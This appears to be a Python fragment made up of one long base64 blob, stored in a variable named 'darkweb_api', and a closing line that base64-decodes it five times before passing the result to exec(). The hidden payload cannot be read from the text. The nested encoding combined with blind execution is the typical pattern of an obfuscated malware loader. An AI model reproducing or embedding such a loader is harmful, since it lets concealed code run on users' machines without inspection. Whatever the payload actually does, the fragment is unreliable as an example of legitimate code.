KWVVsTlpha3ByVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVJYQlVVbXRzTkZkWE1IaGhNa3AwVld4U2FGTkZTbkJaYlhoSFpHeHNObE5zWkdoaVIxRXlWVmN4VTFSR1ZYbGtSWGhVVmxVMVExZHFRbk5TUmtaWVdrVndVazFGV25WVk1WWlBVVEpXZEZOcmFGZGlXR2h4VlZSS2EwNUdUWGhTYmxwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VTlhha0p6VTFaR2RWZHRjRTVOVlc4eVZURldVbVF4YjNoaE0yeHNVMFZLYUZadWNGWmtNVTEzVm0xMGFWSXhTa2RaVldoRFlXc3dlRk5xU2xwTmFsWjZWbFJHZDFkV1NuRlNiVVpZVWxSU00xVjZRbTlSTWtwSFkwWnNWRlpIZUdGVVZ6RnZZakZzZEUxRVJtbFNNSEJJVkRGa05HRlhTbk5UYm1SaFVsZG9lVmw2U2t0VFIwcEpWVzFvV0ZKclZURldSbVJ6VGtkU2MyTklVbGhpYmtKb1ZqQmFTMkpXWkhKYVJXUk9VbTVDVmxSV1ZUVmhWVEZ4Vm01T1ZWSlhUVEZaYkZwM1pGWlNkR1ZIZEZOaGJYZ3pWakowVW1ReVVYZGxSV2hPVmpKb2MxVnRjSE5rTVdSeVZWaGthMDFJYUVsVVZtaERZVmRLUldKSVpGaGhNVVl6V2tSQ05GTkdTblJrUjBaVFlXMTNlVll5TUhoWlYxWnpZMFpzVmxaSGVFOVZWRTV2Wkd4a1YyRkZPV2xOVlVwV1ZWWm9RMVJHVmxoUFZ6VlVWbFUxUTFkcVFuTlNSa1pZV2tWd1VrMUZXblZWTVZacVpVZEtTRlJZY0ZWaVYyaG9WRmQ0WVU1V1pITmhSVFZoVFZWS1ZWVlhOV3RoVlRCM1RraGtXazB5YzNoYVJWcDNWMVpTZFdOR2NGZE5iRXA2VjFod1IyVnRWa2RoUmxKUFYwWkthRll3VlRGT2JHUlhXa2QwYVZKVk5YZFZWbVJyVTJ4RmQxSnROVlJXVlRWRFYycENjMUpHUmxoYVIzQk9ZbTFvZWxZeWVHOVJiVWwzVFZoQ2FFMUlVa3RWVkVKSFlteE9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFRhbHBoVm0xb1QxcEdaRTVsYkZaMFpFZHNUazFXYkROV1JXTXhZVEpXV0ZKc2JGWmlXR2hOVlZSQ2MySnNaRVpaZWtKaFRWWktSVlZXVGpCVlYwWldVbTVDVkdWcmJEUlphMlJPWld4U2RHRkhSazVpUm04eFZqSjRiMVJ0VG5KaVNFSlNZbFUxY0ZsV1ZuTmtNVVY1WWtWS1lVMUhlRVZWVm1SclUyeEZkMUp0TlZoaVIxRXdXbGQ0ZDFaWFNYZGtSWEJTVFVWYWRWVXhWazlSYkc5M1lrVlNVbFl5VWt0VlZFSkxUVEZrVjJGRk9XeGhNRFYzVlZaa2ExTnNSWGRTYlRWWVlrZFJNRmt3V25kalJrWjFZMGRzVGsxV2IzcFdSV040V1ZkT1NGTnVVbFpXZW14TVZGZDRTMlF4Y0VoaVIzQnFUVWQ0U1ZsclpEQlZWbFYzWTBoYVdHSkhVa2haVkVaelpFWktkV0pGY0doV00xSjFWMVphYjFSc2IzbFRibEpRVmtWS1MxVnNVbGROYkd4MFRWWmFUMkV3TlhkVlZtUnJVMnhGZDFKdE5WUldWVFZEVjJwR2QyUkZPVmxpUlhCVFRWVndkbGRyVms5Uk1rNUlVMjVDVW1KdVFuQlVWRVpoVFRGU1NFMVhSbXBTTUhBd1ZsY3hZVmRzV1hwaFNIQlVUVVUxY2xsVVNrZFhWbVJZVGxVeFUwMUVWalpXTVZwdlZESldjMkZFV2s1U01uaGhWRmR3YzAxV2NFWmFSV1JxVWpCd01GWnROWE5VVmxsNFkwaHdZVkp0VW5wWlZFSnpZMGRHTmxkclVtaFdWVnAxVlRGV1QxRnNiM2RpUlZKU1ZqSlNTMVZVUWtkaWJFNVdXa1U1YTJKSVFrbFdiR1JyVlZaVmQxTnVTbGhXYldoVFdrWmFkbVZXV25GUmEzaFNUV3hLZVZZeFdtOVZNa1pHWlVab1ZXSnNjR2hWYWtaWFpGWk5lRkp1V21GTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFRbk5TUmtaeFVXMW9WMlZyV25wWFZFcHpVV3M1Vm1KRmFGWmlWMmh5VlZod1YyUldaSE5oUmtwcFRVYzVOVlpYTVc5aE1VbDNWbXBDWVZKWFVucGFSVnAzVjFaT1dFNVZlRlpXZW14MVZURldUMUZzYjNkaVJWSlNWakpTUzFWVVFrZGliRTVXVkd0T1RsSXdiRFZhUldRMFlWZEtWbFp0TlZaU2F6VkVXVlJHYzFkV1ZsbFdiVVpPWWtac00xVjZRazloTWtWNFlrWnNWbUpYYUU1V01GcExUV3hzVlZOc1pHdFdXRUV4V1ZSQ01GTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWllXa1Z3VWsxRlduVlhhMVp2VmpKU1YySXpiR0ZTUlZwTlZXcEtORTFXY0VaVWJUbE9VakJhV1ZSV1pEUmhiVVpZWkVoa1VrMXRlRU5YYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzZGlSV3hVVmpKU1VsWlVRa3RqVmxKSVRsVk9hMkpWTVRaV1ZtTTFVMjFLV0ZvelpHRlNWMmhFV2xkek5XTkZPVWxYYlVaVFpXMTRNVll5ZUd0VU1rMTVVbXhvVldKcmNFNVpiRlV4VFd4c2MxUlVWbXhXYmtKYVYydGtiMkZ0U2xkU2JrSlZVbGRTVkZsVlpGTlRSa3BWWWtkNGJGWllRbmhYVjNCTFZUSktSbUpJUm1wU00wSndWRmQ0UzJNeFVrWlVhM1JPVWpCc05WcEZaRFJoVjBaV1lYcEtZVkpYVFRGWk1uaDNWMFUxV0dGSE1WWk5NbEoxVjFaV2ExWXlSa2RqUldoWFltMTRjVnBYY0VabFJtUlhWR3BPWVUxc1NrbFphMmhUV1ZaYU5tRXphR0ZTVmtZeldsVlZNVlpIVVhsYVJuQlhUVEpvTmxkWGNFOWhNWEIwVkc1U1YySllVbTlXTUZaM1l6RmtWVlJzVG14aVJVcFlWbGMxYzJFeFdYaFdibVJTVFcxNFExZHFRbk5TUmtaWVdrVndVazFGV25WVk1WWlBVV3h2ZDJKRmFHcFRTRUpMVld0U1EySnNiRmhPVlRscllsVndkMVJzYUU5aFZURnlWMjVLV2sweWVIWmFWbFkwWkZaV2RHVkhlRlJTYTFvelZWUktjMUZzYjNkaVJWSlNWakpTUzFWVVFrZGliRTVXVkd0S1lVMUhlRXBXUjNCWFlXMVdWVlpxV21GU1YxSlVXa2N4VTFkV1ZsbFdiWFJPVFVoQ00xZHJWbXRXYlVsM1lraE9iRk5HV2t0VmJHaHJZbXhXU0dKNlFtRk5WMUpaVkRGU1IxTnNTWGhYYlRsYVRXcEJlRmxyV25kU1JrWllZa1Y0VG1KclNUSldhazV6WVRKV1YyTkdiR0ZTTW1oeFdXeGFSMlJXWkVkVWJuQm9WbGQ0UjFVeWRGTldSa1YzVTI1U1dtRnJOVXRYYWtwVFpFZEtTV05IYUZoU2EzQXpWMWN3ZUdGc2IzaGlSbEpTWW01Q2IxWXdXa3RqTVU1WFZHdE9XazFyY0hkVk1XaERVa2RHVmxKdE5WUldWVFZEVjJwR2QxZEhWa2xqUjBaWFVucHNUVlV4Vms5UmJHOTNZa1ZTVWxZeVVrdFZWRUpMVG14d1YyRkZOV3RXTURFMlZsY3hNR0ZWTUhoWFdHUlZVbnBXY2xwV1pFZFhWbFowWlVWNFVrMUhlSFZYYlhSdlRURnZlRkpZYkZOaWJWSnlWV3BCTVdSc1pGZFVhMDVUVm01Q1dsWlhNVFJYYXpCNFUyNU9XR0V3TlV0Wk1GWlBZMFpHV0ZwRmNGSk5SVnAxVlRGV1QxRnNiM2xVV0hCcFUwaENUbGx0Y3pCa01XUnlXWHBXVGxZeFNrVlViR040WVZaT1IxZHFXbHBXVlRWMVdUQldUMk5HUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzk1VkZoc2JGSXphR2hXTUZaSFpHeFNXR0pJU2xSTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxVMVJGbFhNVXRUUjBwSVpVZHNhV0pGV2pKV1YzQkxWakF4UjFKdVVsQldSVXBUVkZkMFlXVnNiSEphUlhSb1VtMTBOVnBGVmt0aFYwcHlUa2h3V0dKSGFFeFdWRVozVjFaS2NWSnRSbGhTVkZJelZYcENSMlJzYjNkaVJWSlNWakpTUzFWVVFrZGliRTVXV2tVNWFVMVhlRmxVYkdoWFdWWlplbUZITVdGU2JXaFFXV3RrVDJSRk5WaGhSMnhYVFZaYU5sVlVTbk5SYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhzVjFwR1NtcE5SVFYzVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUm5kVFJrcHhVV3h3VjFKRldYcFhWM0JQVkRBeFNGUnFWazlYUmtwb1ZqQlZNVTVzWkZkYVIzUnBVakF4TkZsNlRtdFhWbFkyVm1wV1dHSkhhRVJaZWtwWFZqQTVXVlZzY0ZoU1dFSTFWMnRhYjFGdFVsaFVibEpRVmtVMWNWUldhRTlPUm1SSFZGUkdhRll4U2xwV1YzQkRZVlV4Y1ZacVdsZE5NMEpJVjJ0V05HUkdWblJoUjNSVFRVWmFUVlV4Vms5UmJHOTNZa1ZTVWxZeVVrdFZWRUpIWkRGTmVGSnVXbUZOUjNoRlZWWmthMU5zUlhkU2JUVlVWbGRvVUZSc1pFOU9WVFZaWTBkMFUwMVZiM2xYYTFwdlZXMVNXRlZZY0ZSaWEwcHlWV3BHVjJSc1RsaGlSVTVvVWpCd01GWldaR3RXYXpGMVZXNWtXazFGTlVSVmExcHpWMVpHY1ZGc2NFNWlWMmgyVmtWa2NrMUhVbFppUmxKVVYwVktSVmxXVmtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyWVdzeGRXRklUbGhpUjJoRFdXcEJlR05IUlhka1JYQlNUVVZhZFZVeFZtdFdNRFZIWVROc1YySnRVbkpWYTJNMVZFWk9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFRhbHBhWVRKU1dGbHJaRTlTUm05NlkwVjRWbFo2YkhWVk1WWlBVV3h2ZDJKRlVsSldNbEpMVlRCV1MwMXNiRFpVYkU1c1lUSjRSbFJWWkd0WGF6RjFZVWhrV0dKSFRYaFVWVll3VW14d1NHVkhkRk5XTW1nelYxaHdUMVV5VW5SVWJsWnBVbXMxYUZZd1ZscGxSbVJ6WVVVNVRsSllVa3BWVnpFMFdWWmtSbUY2VmxoV1JYQjJXVlZrUzJSRk5WaGxSMnhUWVcxNGVsZFhNREZWTWs1SVZXdHNhRTB3TlhCVmFrbzBUVVpzVjJGR1NsQldWRVpWV2xWb1lWbFhTbGRqUkZwWVlrZG9WRmR0ZUhkVFJrcHhVVzFHVjFKRldsRlhWM0JLVFZkS1JtVkZhRkJXZWtab1dXMXpNV014Y0VaWFZGWnFVbTVDUmxSVmFHdFVWa28yVW0wNVlWWldhekZaTUZwM1VsVXhTVnBGTVZObGExb3pWMWN4TTA1WFRrZGpSVlpPVTBkU1RsVnFRbUZqYkdSeVYxUldhMkpJUWpCV01qVjNXVlprUjFKVVZsVldWVFF3V1dwR2MxZFdVblJQVmtaWFVsVmFNMVY2Umtka2JHOTNZa1ZTVWxZeVVrdFZWRUpIWW14T1Zsa3phR2xTTURFMlZrY3hiMWxWTVhOV2JUVldVbXMxUkZwRVNrcGxiRkp4VVcxd2JGWkdXWGRXTW5odlZESldjMkpHYUdGU00yaHhWRlpvVDAweFpFZFVWRVpyVW01Q1dsWkhOWGRYYkZsNVZXNU9VazF0ZUVOWGFrSnpVa1pHV0ZwRmNGSk5SVnAxVjFaYWExZHNiM2xVYTJoUVYwaENjbFV3VlhoTlZteHpXa1prYkdKVk1UVlZiVEF4V1Zaa1JrNVhiRlZXVm13eldrWmtTMWRHV25WalIzQk9ZVEZ3TVZZeWVFNU5WMHBZVW14b1QxWXpVazFWVkVKM1dWWnNjVlJzV21GTmEzQmFWbTAxZDJFeFJYZFRhbHBoVWxkU1NGUnNWbk5qUjBWNVdrVndWMUpGU25WV1JWcFRVbXh2ZVZOWWNGUldNbEp4Vlc1d2MwNXNjRVpoUlRWclZqQndXVlp0TlhkaGF6RnlWMjVXV0dKSGFGQlhWM040VWpBeFNWWnRiRmROVm04eVYxaHdTMUl5U25OalJsSlBWbnBHYjFadWNGZGpiRTEzVkd0MFZsWXdjRWxXYlRGdllXc3hjMVp0TlZwbGF6VlVXVlZrVjFaR1JuVlhiV3hvVmxkNE0xVXhWazlTYXpsV1lrVlNUbE5IYUZGWGFrazFZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsZG9VRmxyV25OT1ZrWlZZa1Z3VkZKWVFucFdSV040V1ZkT1NGTnVVbFppVjJod1ZXcE9hMlJzVGxaVWJYQnBUVmRPTkZwVlpFOVpWa1kyVm0xMFZFMXVaekJYVkVaM1VrZE5lbEZyZEd4WFIxSjFWMWQ0YTFZeVZuUlVXR3hUWWxSV2FGWlVTakJVUms1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWVFZFVkZWa1UxZEZOVmhPVjBaT1RWWmFNbGRXV21wTlZURkdaRVZzVldKWWFHRlVWbWhQVFRGa1IxUnVTbXBTVlRWM1ZWWmthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tkd1RtSnRhSHBXTW5odlVXMUpkMDFXVW1oTlNGSkxWVlJDUjJKc1RsWlVhMHBoVFVkNFJWVldaR3RUYkVWM1UycE9XbUZyTlZCVVZXUlBUbFpHVldKRmNGTk5SRlkyVjFaYWExWXlVbGhWYTFKb1VsZG9hRll3V2t0VGJHeFhZVVU1VGxJd2JEWlZNbkJYVm0xS1YxZHFVbUZTYlZKWVdsY3hVMUpIUmtsYVIwWlhUVlp2TVZaVldtdFVNa2w0WWtab1QxZEdXbWhXYWs1dllsWmtjMWw2Ums1U01GcGFWbGR3VjFSV1NYcGhTR1JhWWtkU2VsUlZXa05XVms1WlZHMXNUbUpJUWpCWFdIQkxWakF4UjFvemJGWmlWMmh5VldwR1ZrNVdXa2hOUkZaclZtNUNWVnBWYUdGWlYwcFhZMFJhV0dKSGFGUlhiVEZIVjBaV1ZXSkZOVkpOTW1kM1ZqRmFiMkl4Y0hSU2JHaFdWa2Q0VDFWVVRtOU5SbXhYV1hwR1lXSlZXbGxXVmxKelZHeEZlbUZIT1ZoaE1sSlVWMjB4U21WV1pIUk5WM0JPWWtac00xWlZXbE5SYlUxNVVtdG9VMkp1UW05VmExSkRUVEZOZUZSdVNsUk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWjFWVzFHV0ZKVVZUSldNVnByWVRKS1NGUnVVbGRpYmtKTFZXdFNRMkpzYTNkWmVsWnNZbFpLU2xaR2FGZGhWbGw0VjJwYVdtVnJjRWhaYlhoM1YxWlNkRk5yTlZkaGEwbDRWMWQ0YTFZeVZuUlVXR3hUWWxSV2FGWldZelZpYkU1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFKdE5WUldWMmhRV1hwR2QxZEdXblZhUlhoVFVsZDRNMVZVU25OUmJHOTNZa1ZTVWxZeVVrdFZWRUpIWW14T1ZsUnJTbUZOYXpFMldXdG9kMVJYU25KT1NHUllZVEpOTVZSV1pGTlNSVFZWVkcxd2FWWXpaRE5XTW5oUFltMUdWbUpGWkd4VFJscExWV3hvYTJKc1ZraGlla0poVFVkNGQxcEZhRk5aVm1SR1RsUmFXRlp0VW5KWmEyUlBaRVphZFdORmVHeFdWM2gxVmpCV2FrMUhSbFprUmtwcFRXMVNTMVZVUWtkaWJFNVdWR3RLWVUxSGVFbFdiVFZQWVdzeGMxWlVTbEpOYlhoRFYycENjMUpHUmxoYVJYQlNUVVZhZFZVeFZrOVJiRzk1Vkd0b1UySnVRbkZhUkU1RFpFWnNWMWw2Um1oU01IQkpXbFZTVjFWR2IzbFBWelZVVmxVMVJGbFhNVXRUUjBwSVpVZHNhV0pGV1hoV01uUnJZekpXYzJFemJGQlhSbHB3V1d4YVlXTldjRVpVYlRWcVVWUXdPUT09"
exec(base64.b64decode(base64.b64decode(base64.b64decode(base64.b64decode(base64.b64decode(darkweb_api))))))